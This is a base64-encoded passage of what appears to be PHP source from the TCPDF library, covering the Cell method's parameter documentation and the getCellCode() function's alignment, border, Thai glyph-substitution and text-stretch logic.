dGhlIGNlbGwgY29ycmVzcG9uZHMgdG8gdGhlIGN1cnJlbnQgcG9zaXRpb24uIFRoZSB0ZXh0IGNhbiBiZSBhbGlnbmVkIG9yIGNlbnRlcmVkLiBBZnRlciB0aGUgY2FsbCwgdGhlIGN1cnJlbnQgcG9zaXRpb24gbW92ZXMgdG8gdGhlIHJpZ2h0IG9yIHRvIHRoZSBuZXh0IGxpbmUuIEl0IGlzIHBvc3NpYmxlIHRvIHB1dCBhIGxpbmsgb24gdGhlIHRleHQuPGJyIC8+CgkgKiBJZiBhdXRvbWF0aWMgcGFnZSBicmVha2luZyBpcyBlbmFibGVkIGFuZCB0aGUgY2VsbCBnb2VzIGJleW9uZCB0aGUgbGltaXQsIGEgcGFnZSBicmVhayBpcyBkb25lIGJlZm9yZSBvdXRwdXR0aW5nLgoJICogQHBhcmFtIGZsb2F0ICR3IENlbGwgd2lkdGguIElmIDAsIHRoZSBjZWxsIGV4dGVuZHMgdXAgdG8gdGhlIHJpZ2h0IG1hcmdpbi4KCSAqIEBwYXJhbSBmbG9hdCAkaCBDZWxsIGhlaWdodC4gRGVmYXVsdCB2YWx1ZTogMC4KCSAqIEBwYXJhbSBzdHJpbmcgJHR4dCBTdHJpbmcgdG8gcHJpbnQuIERlZmF1bHQgdmFsdWU6IGVtcHR5IHN0cmluZy4KCSAqIEBwYXJhbSBtaXhlZCAkYm9yZGVyIEluZGljYXRlcyBpZiBib3JkZXJzIG11c3QgYmUgZHJhd24gYXJvdW5kIHRoZSBjZWxsLiBUaGUgdmFsdWUgY2FuIGJlIGEgbnVtYmVyOjx1bD48bGk+MDogbm8gYm9yZGVyIChkZWZhdWx0KTwvbGk+PGxpPjE6IGZyYW1lPC9saT48L3VsPiBvciBhIHN0cmluZyBjb250YWluaW5nIHNvbWUgb3IgYWxsIG9mIHRoZSBmb2xsb3dpbmcgY2hhcmFjdGVycyAoaW4gYW55IG9yZGVyKTo8dWw+PGxpPkw6IGxlZnQ8L2xpPjxsaT5UOiB0b3A8L2xpPjxsaT5SOiByaWdodDwvbGk+PGxpPkI6IGJvdHRvbTwvbGk+PC91bD4gb3IgYW4gYXJyYXkgb2YgbGluZSBzdHlsZXMgZm9yIGVhY2ggYm9yZGVyIGdyb3VwIC0gZm9yIGV4YW1wbGU6IGFycmF5KCdMVFJCJyA9PiBhcnJheSgnd2lkdGgnID0+IDIsICdjYXAnID0+ICdidXR0JywgJ2pvaW4nID0+ICdtaXRlcicsICdkYXNoJyA9PiAwLCAnY29sb3InID0+IGFycmF5KDAsIDAsIDApKSkKCSAqIEBwYXJhbSBpbnQgJGxuIEluZGljYXRlcyB3aGVyZSB0aGUgY3VycmVudCBwb3NpdGlvbiBzaG91bGQgZ28gYWZ0ZXIgdGhlIGNhbGwuIFBvc3NpYmxlIHZhbHVlcyBhcmU6PHVsPjxsaT4wOiB0byB0aGUgcmlnaHQgKG9yIGxlZnQgZm9yIFJUTCBsYW5ndWFnZXMpPC9saT48bGk+MTogdG8gdGhlIGJlZ2lubmluZyBvZiB0aGUgbmV4dCBsaW5lPC9saT48bGk+MjogYmVsb3c8L2xpPjwvdWw+UHV0dGluZyAxIGlzIGVxdWl2YWxlbnQgdG8gcHV0dGluZyAwIGFuZCBjYWxsaW5nIExuKCkganVzdCBhZnRlci4gRGVmYXVsdCB2YWx1ZTogMC4KCSAqIEBwYXJhbSBzdHJpbmcgJGFsaWduIEFsbG93cyB0byBjZW50ZXIgb3IgYWxpZ24gdGhlIHRleHQuIFBvc3NpYmxlIHZhbHVlcyBhcmU6PHVsPjxsaT5MIG9yIGVtcHR5IHN0cmluZzogbGVmdCBhbGlnbiAoZGVmYXVsdCB2YWx1ZSk8L2xpPjxsaT5DOiBjZW50ZXI8L2xpPjxsaT5SOiByaWdodCBhbGlnbjwvbGk+PGxpPko6IGp1c3RpZnk8L2xpPjwvdWw+CgkgKiBAcGFyYW0gYm9vbGVhbiAkZmlsbCBJbmRpY2F0ZXMgaWYgdGhlIGNlbGwgYmFja2dyb3VuZCBtdXN0IGJlIHBhaW50ZWQgKHRydWUpIG9yIHRyYW5zcGFyZW50IChmYWxzZSkuCgkgKiBAcGFyYW0gbWl4ZWQgJGxpbmsgVVJMIG9yIGlkZW50aWZpZXIgcmV0dXJuZWQgYnkgQWRkTGluaygpLgoJICogQHBhcmFtIGludCAkc3RyZXRjaCBmb250IHN0cmV0Y2ggbW9kZTogPHVsPjxsaT4wID0gZGlzYWJsZWQ8L2xpPjxsaT4xID0gaG9yaXpvbnRhbCBzY2FsaW5nIG9ubHkgaWYgdGV4dCBpcyBsYXJnZXIgdGhhbiBjZWxsIHdpZHRoPC9saT48bGk+MiA9IGZvcmNlZCBob3Jpem9udGFsIHNjYWxpbmcgdG8gZml0IGNlbGwgd2lkdGg8L2xpPjxsaT4zID0gY2hhcmFjdGVyIHNwYWNpbmcgb25seSBpZiB0ZXh0IGlzIGxhcmdlciB0aGFuIGNlbGwgd2lkdGg8L2xpPjxsaT40ID0gZm9yY2VkIGNoYXJhY3RlciBzcGFjaW5nIHRvIGZpdCBjZWxsIHdpZHRoPC9saT48L3VsPiBHZW5lcmFsIGZvbnQgc3RyZXRjaGluZyBhbmQgc2NhbGluZyB2YWx1ZXMgd2lsbCBiZSBwcmVzZXJ2ZWQgd2hlbiBwb3NzaWJsZS4KCSAqIEBwYXJhbSBib29sZWFuICRpZ25vcmVfbWluX2hlaWdodCBpZiB0cnVlIGlnbm9yZSBhdXRvbWF0aWMgbWluaW11bSBoZWlnaHQgdmFsdWUuCgkgKiBAcGFyYW0gc3RyaW5nICRjYWxpZ24gY2VsbCB2ZXJ0aWNhbCBhbGlnbm1lbnQgcmVsYXRpdmUgdG8gdGhlIHNwZWNpZmllZCBZIHZhbHVlLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+VCA6IGNlbGwgdG9wPC9saT48bGk+QyA6IGNlbnRlcjwvbGk+PGxpPkIgOiBjZWxsIGJvdHRvbTwvbGk+PGxpPkEgOiBmb250IHRvcDwvbGk+PGxpPkwgOiBmb250IGJhc2VsaW5lPC9saT48bGk+RCA6IGZvbnQgYm90dG9tPC9saT48L3VsPgoJICogQHBhcmFtIHN0cmluZyAkdmFsaWduIHRleHQgdmVydGljYWwgYWxpZ25tZW50IGluc2lkZSB0aGUgY2VsbC4gUG9zc2libGUgdmFsdWVzIGFyZTo8dWw+PGxpPlQgOiB0b3A8L2xpPjxsaT5NIDogbWlkZGxlPC9saT48bGk+QiA6IGJvdHRvbTwvbGk+PC91bD4KCSAqIEByZXR1cm4gc3RyaW5nIGNvbnRhaW5pbmcgY2VsbCBjb2RlCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMS4wCgkgKiBAc2VlIENlbGwoKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0Q2VsbENvZGUoJHcsICRoPTAsICR0eHQ9JycsICRib3JkZXI9MCwgJGxuPTAsICRhbGlnbj0nJywgJGZpbGw9ZmFsc2UsICRsaW5rPScnLCAkc3RyZXRjaD0wLCAkaWdub3JlX21pbl9oZWlnaHQ9ZmFsc2UsICRjYWxpZ249J1QnLCAkdmFsaWduPSdNJykgewoJCS8vIHJlcGxhY2UgJ05PLUJSRUFLIFNQQUNFJyAoVSswMEEwKSBjaGFyYWN0ZXIgd2l0aCBhIHNpbXBsZSBzcGFjZQoJCSR0eHQgPSBpc19udWxsKCR0eHQpID8gJycgOiAkdHh0OwoJCSR0eHQgPSBzdHJfcmVwbGFjZShUQ1BERl9GT05UUzo6dW5pY2hyKDE2MCwgJHRoaXMtPmlzdW5pY29kZSksICcgJywgJHR4dCk7CgkJJHByZXZfY2VsbF9tYXJnaW4gPSAkdGhpcy0+Y2VsbF9tYXJnaW47CgkJJHByZXZfY2VsbF9wYWRkaW5nID0gJHRoaXMtPmNlbGxfcGFkZGluZzsKCQkkdHh0ID0gVENQREZfU1RBVElDOjpyZW1vdmVTSFkoJHR4dCwgJHRoaXMtPmlzdW5pY29kZSk7CgkJJHJzID0gJyc7IC8vc3RyaW5nIHRvIGJlIHJldHVybmVkCgkJJHRoaXMtPmFkanVzdENlbGxQYWRkaW5nKCRib3JkZXIpOwoJCWlmICghJGlnbm9yZV9taW5faGVpZ2h0KSB7CgkJCSRtaW5fY2VsbF9oZWlnaHQgPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpOwoJCQlpZiAoJGggPCAkbWluX2NlbGxfaGVpZ2h0KSB7CgkJCQkkaCA9ICRtaW5fY2VsbF9oZWlnaHQ7CgkJCX0KCQl9CgkJJGsgPSAkdGhpcy0+azsKCQkvLyBjaGVjayBwYWdlIGZvciBuby13cml0ZSByZWdpb25zIGFuZCBhZGFwdCBwYWdlIG1hcmdpbnMgaWYgbmVjZXNzYXJ5CgkJbGlzdCgkdGhpcy0+eCwgJHRoaXMtPnkpID0gJHRoaXMtPmNoZWNrUGFnZVJlZ2lvbnMoJGgsICR0aGlzLT54LCAkdGhpcy0+eSk7CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJHggPSAkdGhpcy0+eCAtICR0aGlzLT5jZWxsX21hcmdpblsnUiddOwoJCX0gZWxzZSB7CgkJCSR4ID0gJHRoaXMtPnggKyAkdGhpcy0+Y2VsbF9tYXJnaW5bJ0wnXTsKCQl9CgkJJHkgPSAkdGhpcy0+eSArICR0aGlzLT5jZWxsX21hcmdpblsnVCddOwoJCSRwcmV2X2ZvbnRfc3RyZXRjaGluZyA9ICR0aGlzLT5mb250X3N0cmV0Y2hpbmc7CgkJJHByZXZfZm9udF9zcGFjaW5nID0gJHRoaXMtPmZvbnRfc3BhY2luZzsKCQkvLyBjZWxsIHZlcnRpY2FsIGFsaWdubWVudAoJCXN3aXRjaCAoJGNhbGlnbikgewoJCQljYXNlICdBJzogewoJCQkJLy8gZm9udCB0b3AKCQkJCXN3aXRjaCAoJHZhbGlnbikgewoJCQkJCWNhc2UgJ1QnOiB7CgkJCQkJCS8vIHRvcAoJCQkJCQkkeSAtPSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydUJ107CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQljYXNlICdCJzogewoJCQkJCQkvLyBib3R0b20KCQkJCQkJJHkgLT0gKCRoIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snQiddIC0gJHRoaXMtPkZvbnRBc2NlbnQgLSAkdGhpcy0+Rm9udERlc2NlbnQpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJZGVmYXVsdDoKCQkJCQljYXNlICdDJzoKCQkJCQljYXNlICdNJzogewoJCQkJCQkvLyBjZW50ZXIKCQkJCQkJJHkgLT0gKCgkaCAtICR0aGlzLT5Gb250QXNjZW50IC0gJHRoaXMtPkZvbnREZXNjZW50KSAvIDIpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdMJzogewoJCQkJLy8gZm9udCBiYXNlbGluZQoJCQkJc3dpdGNoICgkdmFsaWduKSB7CgkJCQkJY2FzZSAnVCc6IHsKCQkJCQkJLy8gdG9wCgkJCQkJCSR5IC09ICgkdGhpcy0+Y2VsbF9wYWRkaW5nWydUJ10gKyAkdGhpcy0+Rm9udEFzY2VudCk7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQljYXNlICdCJzogewoJCQkJCQkvLyBib3R0b20KCQkJCQkJJHkgLT0gKCRoIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snQiddIC0gJHRoaXMtPkZvbnREZXNjZW50KTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWRlZmF1bHQ6CgkJCQkJY2FzZSAnQyc6CgkJCQkJY2FzZSAnTSc6IHsKCQkJCQkJLy8gY2VudGVyCgkJCQkJCSR5IC09ICgoJGggKyAkdGhpcy0+Rm9udEFzY2VudCAtICR0aGlzLT5Gb250RGVzY2VudCkgLyAyKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnRCc6IHsKCQkJCS8vIGZvbnQgYm90dG9tCgkJCQlzd2l0Y2ggKCR2YWxpZ24pIHsKCQkJCQljYXNlICdUJzogewoJCQkJCQkvLyB0b3AKCQkJCQkJJHkgLT0gKCR0aGlzLT5jZWxsX3BhZGRpbmdbJ1QnXSArICR0aGlzLT5Gb250QXNjZW50ICsgJHRoaXMtPkZvbnREZXNjZW50KTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWNhc2UgJ0InOiB7CgkJCQkJCS8vIGJvdHRvbQoJCQkJCQkkeSAtPSAoJGggLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10pOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJZGVmYXVsdDoKCQkJCQljYXNlICdDJzoKCQkJCQljYXNlICdNJzogewoJCQkJCQkvLyBjZW50ZXIKCQkJCQkJJHkgLT0gKCgkaCArICR0aGlzLT5Gb250QXNjZW50ICsgJHRoaXMtPkZvbnREZXNjZW50KSAvIDIpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdCJzogewoJCQkJLy8gY2VsbCBib3R0b20KCQkJCSR5IC09ICRoOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnQyc6CgkJCWNhc2UgJ00nOiB7CgkJCQkvLyBjZWxsIGNlbnRlcgoJCQkJJHkgLT0gKCRoIC8gMik7CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OgoJCQljYXNlICdUJzogewoJCQkJLy8gY2VsbCB0b3AKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCS8vIHRleHQgdmVydGljYWwgYWxpZ25tZW50CgkJc3dpdGNoICgkdmFsaWduKSB7CgkJCWNhc2UgJ1QnOiB7CgkJCQkvLyB0b3AKCQkJCSR5dCA9ICR5ICsgJHRoaXMtPmNlbGxfcGFkZGluZ1snVCddOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnQic6IHsKCQkJCS8vIGJvdHRvbQoJCQkJJHl0ID0gJHkgKyAkaCAtICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0InXSAtICR0aGlzLT5Gb250QXNjZW50IC0gJHRoaXMtPkZvbnREZXNjZW50OwoJCQkJYnJlYWs7CgkJCX0KCQkJZGVmYXVsdDoKCQkJY2FzZSAnQyc6CgkJCWNhc2UgJ00nOiB7CgkJCQkvLyBjZW50ZXIKCQkJCSR5dCA9ICR5ICsgKCgkaCAtICR0aGlzLT5Gb250QXNjZW50IC0gJHRoaXMtPkZvbnREZXNjZW50KSAvIDIpOwoJCQkJYnJlYWs7CgkJCX0KCQl9CgkJJGJhc2Vmb250eSA9ICR5dCArICR0aGlzLT5Gb250QXNjZW50OwoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdykgT1IgKCR3IDw9IDApKSB7CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkdyA9ICR4IC0gJHRoaXMtPmxNYXJnaW47CgkJCX0gZWxzZSB7CgkJCQkkdyA9ICR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4gLSAkeDsKCQkJfQoJCX0KCQkkcyA9ICcnOwoJCS8vIGZpbGwgYW5kIGJvcmRlcnMKCQlpZiAoaXNfc3RyaW5nKCRib3JkZXIpIEFORCAoc3RybGVuKCRib3JkZXIpID09IDQpKSB7CgkJCS8vIGZ1bGwgYm9yZGVyCgkJCSRib3JkZXIgPSAxOwoJCX0KCQlpZiAoJGZpbGwgT1IgKCRib3JkZXIgPT0gMSkpIHsKCQkJaWYgKCRmaWxsKSB7CgkJCQkkb3AgPSAoJGJvcmRlciA9PSAxKSA/ICdCJyA6ICdmJzsKCQkJfSBlbHNlIHsKCQkJCSRvcCA9ICdTJzsKCQkJfQoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHhrID0gKCgkeCAtICR3KSAqICRrKTsKCQkJfSBlbHNlIHsKCQkJCSR4ayA9ICgkeCAqICRrKTsKCQkJfQoJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiAlRiAlRiByZSAlcyAnLCAkeGssICgoJHRoaXMtPmggLSAkeSkgKiAkayksICgkdyAqICRrKSwgKC0kaCAqICRrKSwgJG9wKTsKCQl9CgkJLy8gZHJhdyBib3JkZXJzCgkJJHMgLj0gJHRoaXMtPmdldENlbGxCb3JkZXIoJHgsICR5LCAkdywgJGgsICRib3JkZXIpOwoJCWlmICgkdHh0ICE9ICcnKSB7CgkJCSR0eHQyID0gJHR4dDsKCQkJaWYgKCR0aGlzLT5pc3VuaWNvZGUpIHsKCQkJCWlmICgoJHRoaXMtPkN1cnJlbnRGb250Wyd0eXBlJ10gPT0gJ2NvcmUnKSBPUiAoJHRoaXMtPkN1cnJlbnRGb250Wyd0eXBlJ10gPT0gJ1RydWVUeXBlJykgT1IgKCR0aGlzLT5DdXJyZW50Rm9udFsndHlwZSddID09ICdUeXBlMScpKSB7CgkJCQkJJHR4dDIgPSBUQ1BERl9GT05UUzo6VVRGOFRvTGF0aW4xKCR0eHQyLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOwoJCQkJfSBlbHNlIHsKCQkJCQkkdW5pY29kZSA9IFRDUERGX0ZPTlRTOjpVVEY4U3RyaW5nVG9BcnJheSgkdHh0LCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOyAvLyBhcnJheSBvZiBVVEYtOCB1bmljb2RlIHZhbHVlcwoJCQkJCSR1bmljb2RlID0gVENQREZfRk9OVFM6OnV0ZjhCaWRpKCR1bmljb2RlLCAnJywgJHRoaXMtPnRtcHJ0bCwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkJCQkvLyByZXBsYWNlIHRoYWkgY2hhcnMgKGlmIGFueSkKCQkJCQlpZiAoZGVmaW5lZCgnS19USEFJX1RPUENIQVJTJykgQU5EIChLX1RIQUlfVE9QQ0hBUlMgPT0gdHJ1ZSkpIHsKCQkJCQkJLy8gbnVtYmVyIG9mIGNoYXJzCgkJCQkJCSRudW1jaGFycyA9IGNvdW50KCR1bmljb2RlKTsKCQkJCQkJLy8gcG8gcGxhLCBmb3IgZmFyLCBmb3IgZmFuCgkJCQkJCSRsb25ndGFpbCA9IGFycmF5KDB4MGUxYiwgMHgwZTFkLCAweDBlMWYpOwoJCQkJCQkvLyBkbyBjaGFkYSwgdG8gcGF0YWsKCQkJCQkJJGxvd3RhaWwgPSBhcnJheSgweDBlMGUsIDB4MGUwZik7CgkJCQkJCS8vIG1haSBodW4gYXJrYWQsIHNhcmEgaSwgc2FyYSBpaSwgc2FyYSB1ZSwgc2FyYSB1ZWUKCQkJCQkJJHVwdm93ZWwgPSBhcnJheSgweDBlMzEsIDB4MGUzNCwgMHgwZTM1LCAweDBlMzYsIDB4MGUzNyk7CgkJCQkJCS8vIG1haSBlaywgbWFpIHRobywgbWFpIHRyaSwgbWFpIGNoYXR0YXdhLCBrYXJhbgoJCQkJCQkkdG9uZW1hcmsgPSBhcnJheSgweDBlNDgsIDB4MGU0OSwgMHgwZTRhLCAweDBlNGIsIDB4MGU0Yyk7CgkJCQkJCS8vIHNhcmEgdSwgc2FyYSB1dSwgcGludGh1CgkJCQkJCSRsb3d2b3dlbCA9IGFycmF5KDB4MGUzOCwgMHgwZTM5LCAweDBlM2EpOwoJCQkJCQkkb3V0cHV0ID0gYXJyYXkoKTsKCQkJCQkJZm9yICgkaSA9IDA7ICRpIDwgJG51bWNoYXJzOyAkaSsrKSB7CgkJCQkJCQlpZiAoKCR1bmljb2RlWyRpXSA+PSAweDBlMDApICYmICgkdW5pY29kZVskaV0gPD0gMHgwZTViKSkgewoJCQkJCQkJCSRjaDAgPSAkdW5pY29kZVskaV07CgkJCQkJCQkJJGNoMSA9ICgkaSA+IDApID8gJHVuaWNvZGVbKCRpIC0gMSldIDogMDsKCQkJCQkJCQkkY2gyID0gKCRpID4gMSkgPyAkdW5pY29kZVsoJGkgLSAyKV0gOiAwOwoJCQkJCQkJCSRjaG4gPSAoJGkgPCAoJG51bWNoYXJzIC0gMSkpID8gJHVuaWNvZGVbKCRpICsgMSldIDogMDsKCQkJCQkJCQlpZiAoaW5fYXJyYXkoJGNoMCwgJHRvbmVtYXJrKSkgewoJCQkJCQkJCQlpZiAoJGNobiA9PSAweDBlMzMpIHsKCQkJCQkJCQkJCS8vIHNhcmEgdW0KCQkJCQkJCQkJCWlmIChpbl9hcnJheSgkY2gxLCAkbG9uZ3RhaWwpKSB7CgkJCQkJCQkJCQkJLy8gdG9uZW1hcmsgYXQgdXBwZXIgbGVmdAoJCQkJCQkJCQkJCSRvdXRwdXRbXSA9ICR0aGlzLT5yZXBsYWNlQ2hhcigkY2gwLCAoMHhmNzEzICsgJGNoMCAtIDB4MGU0OCkpOwoJCQkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJCQkvLyB0b25lbWFyayBhdCB1cHBlciByaWdodCAobm9ybWFsIHBvc2l0aW9uKQoJCQkJCQkJCQkJCSRvdXRwdXRbXSA9ICRjaDA7CgkJCQkJCQkJCQl9CgkJCQkJCQkJCX0gZWxzZWlmIChpbl9hcnJheSgkY2gxLCAkbG9uZ3RhaWwpIE9SIChpbl9hcnJheSgkY2gyLCAkbG9uZ3RhaWwpIEFORCBpbl9hcnJheSgkY2gxLCAkbG93dm93ZWwpKSkgewoJCQkJCQkJCQkJLy8gdG9uZW1hcmsgYXQgbG93ZXIgbGVmdAoJCQkJCQkJCQkJJG91dHB1dFtdID0gJHRoaXMtPnJlcGxhY2VDaGFyKCRjaDAsICgweGY3MDUgKyAkY2gwIC0gMHgwZTQ4KSk7CgkJCQkJCQkJCX0gZWxzZWlmIChpbl9hcnJheSgkY2gxLCAkdXB2b3dlbCkpIHsKCQkJCQkJCQkJCWlmIChpbl9hcnJheSgkY2gyLCAkbG9uZ3RhaWwpKSB7CgkJCQkJCQkJCQkJLy8gdG9uZW1hcmsgYXQgdXBwZXIgbGVmdAoJCQkJCQkJCQkJCSRvdXRwdXRbXSA9ICR0aGlzLT5yZXBsYWNlQ2hhcigkY2gwLCAoMHhmNzEzICsgJGNoMCAtIDB4MGU0OCkpOwoJCQkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJCQkvLyB0b25lbWFyayBhdCB1cHBlciByaWdodCAobm9ybWFsIHBvc2l0aW9uKQoJCQkJCQkJCQkJCSRvdXRwdXRbXSA9ICRjaDA7CgkJCQkJCQkJCQl9CgkJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCQkvLyB0b25lbWFyayBhdCBsb3dlciByaWdodAoJCQkJCQkJCQkJJG91dHB1dFtdID0gJHRoaXMtPnJlcGxhY2VDaGFyKCRjaDAsICgweGY3MGEgKyAkY2gwIC0gMHgwZTQ4KSk7CgkJCQkJCQkJCX0KCQkJCQkJCQl9IGVsc2VpZiAoKCRjaDAgPT0gMHgwZTMzKSBBTkQgKGluX2FycmF5KCRjaDEsICRsb25ndGFpbCkgT1IgKGluX2FycmF5KCRjaDIsICRsb25ndGFpbCkgQU5EIGluX2FycmF5KCRjaDEsICR0b25lbWFyaykpKSkgewoJCQkJCQkJCQkvLyBhZGQgbG93ZXIgbGVmdCBuaWtoYWhpdCBhbmQgc2FyYSBhYQoJCQkJCQkJCQlpZiAoJHRoaXMtPmlzQ2hhckRlZmluZWQoMHhmNzExKSBBTkQgJHRoaXMtPmlzQ2hhckRlZmluZWQoMHgwZTMyKSkgewoJCQkJCQkJCQkJJG91dHB1dFtdID0gMHhmNzExOwoJCQkJCQkJCQkJJHRoaXMtPkN1cnJlbnRGb250WydzdWJzZXRjaGFycyddWzB4ZjcxMV0gPSB0cnVlOwoJCQkJCQkJCQkJJG91dHB1dFtdID0gMHgwZTMyOwoJCQkJCQkJCQkJJHRoaXMtPkN1cnJlbnRGb250WydzdWJzZXRjaGFycyddWzB4MGUzMl0gPSB0cnVlOwoJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJJG91dHB1dFtdID0gJGNoMDsKCQkJCQkJCQkJfQoJCQkJCQkJCX0gZWxzZWlmIChpbl9hcnJheSgkY2gxLCAkbG9uZ3RhaWwpKSB7CgkJCQkJCQkJCWlmICgkY2gwID09IDB4MGUzMSkgewoJCQkJCQkJCQkJLy8gbG93ZXIgbGVmdCBtYWkgaHVuIGFya2FkCgkJCQkJCQkJCQkkb3V0cHV0W10gPSAkdGhpcy0+cmVwbGFjZUNoYXIoJGNoMCwgMHhmNzEwKTsKCQkJCQkJCQkJfSBlbHNlaWYgKGluX2FycmF5KCRjaDAsICR1cHZvd2VsKSkgewoJCQkJCQkJCQkJLy8gbG93ZXIgbGVmdAoJCQkJCQkJCQkJJG91dHB1dFtdID0gJHRoaXMtPnJlcGxhY2VDaGFyKCRjaDAsICgweGY3MDEgKyAkY2gwIC0gMHgwZTM0KSk7CgkJCQkJCQkJCX0gZWxzZWlmICgkY2gwID09IDB4MGU0NykgewoJCQkJCQkJCQkJLy8gbG93ZXIgbGVmdCBtYWkgdGFpIGtvbwoJCQkJCQkJCQkJJG91dHB1dFtdID0gJHRoaXMtPnJlcGxhY2VDaGFyKCRjaDAsIDB4ZjcxMik7CgkJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCQkvLyBub3JtYWwgY2hhcmFjdGVyCgkJCQkJCQkJCQkkb3V0cHV0W10gPSAkY2gwOwoJCQkJCQkJCQl9CgkJCQkJCQkJfSBlbHNlaWYgKGluX2FycmF5KCRjaDEsICRsb3d0YWlsKSBBTkQgaW5fYXJyYXkoJGNoMCwgJGxvd3Zvd2VsKSkgewoJCQkJCQkJCQkvLyBsb3dlciB2b3dlbAoJCQkJCQkJCQkkb3V0cHV0W10gPSAkdGhpcy0+cmVwbGFjZUNoYXIoJGNoMCwgKDB4ZjcxOCArICRjaDAgLSAweDBlMzgpKTsKCQkJCQkJCQl9IGVsc2VpZiAoKCRjaDAgPT0gMHgwZTBkKSBBTkQgaW5fYXJyYXkoJGNobiwgJGxvd3Zvd2VsKSkgewoJCQkJCQkJCQkvLyB5byB5aW5nIHdpdGhvdXQgbG93ZXIgcGFydAoJCQkJCQkJCQkkb3V0cHV0W10gPSAkdGhpcy0+cmVwbGFjZUNoYXIoJGNoMCwgMHhmNzBmKTsKCQkJCQkJCQl9IGVsc2VpZiAoKCRjaDAgPT0gMHgwZTEwKSBBTkQgaW5fYXJyYXkoJGNobiwgJGxvd3Zvd2VsKSkgewoJCQkJCQkJCQkvLyB0aG8gc2FudGFuIHdpdGhvdXQgbG93ZXIgcGFydAoJCQkJCQkJCQkkb3V0cHV0W10gPSAkdGhpcy0+cmVwbGFjZUNoYXIoJGNoMCwgMHhmNzAwKTsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkkb3V0cHV0W10gPSAkY2gwOwoJCQkJCQkJCX0KCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJLy8gbm9uLXRoYWkgY2hhcmFjdGVyCgkJCQkJCQkJJG91dHB1dFtdID0gJHVuaWNvZGVbJGldOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCSR1bmljb2RlID0gJG91dHB1dDsKCQkJCQkJLy8gdXBkYXRlIGZvbnQgc3Vic2V0Y2hhcnMKCQkJCQkJJHRoaXMtPnNldEZvbnRTdWJCdWZmZXIoJHRoaXMtPkN1cnJlbnRGb250Wydmb250a2V5J10sICdzdWJzZXRjaGFycycsICR0aGlzLT5DdXJyZW50Rm9udFsnc3Vic2V0Y2hhcnMnXSk7CgkJCQkJfSAvLyBlbmQgb2YgS19USEFJX1RPUENIQVJTCgkJCQkJJHR4dDIgPSBUQ1BERl9GT05UUzo6YXJyVVRGOFRvVVRGMTZCRSgkdW5pY29kZSwgZmFsc2UpOwoJCQkJfQoJCQl9CgkJCSR0eHQyID0gVENQREZfU1RBVElDOjpfZXNjYXBlKCR0eHQyKTsKCQkJLy8gZ2V0IGN1cnJlbnQgdGV4dCB3aWR0aCAoY29uc2lkZXJpbmcgZ2VuZXJhbCBmb250IHN0cmV0Y2hpbmcgYW5kIHNwYWNpbmcpCgkJCSR0eHdpZHRoID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCR0eHQpOwoJCQkkd2lkdGggPSAkdHh3aWR0aDsKCQkJLy8gY2hlY2sgZm9yIHN0cmV0Y2ggbW9kZQoJCQlpZiAoJHN0cmV0Y2ggPiAwKSB7CgkJCQkvLyBjYWxjdWxhdGUgcmF0aW8gYmV0d2VlbiBjZWxsIHdpZHRoIGFuZCB0ZXh0IHdpZHRoCgkJCQlpZiAoJHdpZHRoIDw9IDApIHsKCQkJCQkkcmF0aW8gPSAxOwoJCQkJfSBlbHNlIHsKCQkJCQkkcmF0aW8gPSAoKCR3IC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snTCddIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddKSAvICR3aWR0aCk7CgkJCQl9CgkJCQkvLyBjaGVjayBpZiBzdHJldGNoaW5nIGlzIHJlcXVpcmVkCgkJCQlpZiAoKCRyYXRpbyA8IDEpIE9SICgoJHJhdGlvID4gMSkgQU5EICgoJHN0cmV0Y2ggJSAyKSA9PSAwKSkpIHsKCQkJCQkvLyB0aGUgdGV4dCB3aWxsIGJlIHN0cmV0Y2hlZCB0byBmaXQgY2VsbCB3aWR0aAoJCQkJCWlmICgkc3RyZXRjaCA+IDIpIHsKCQkJCQ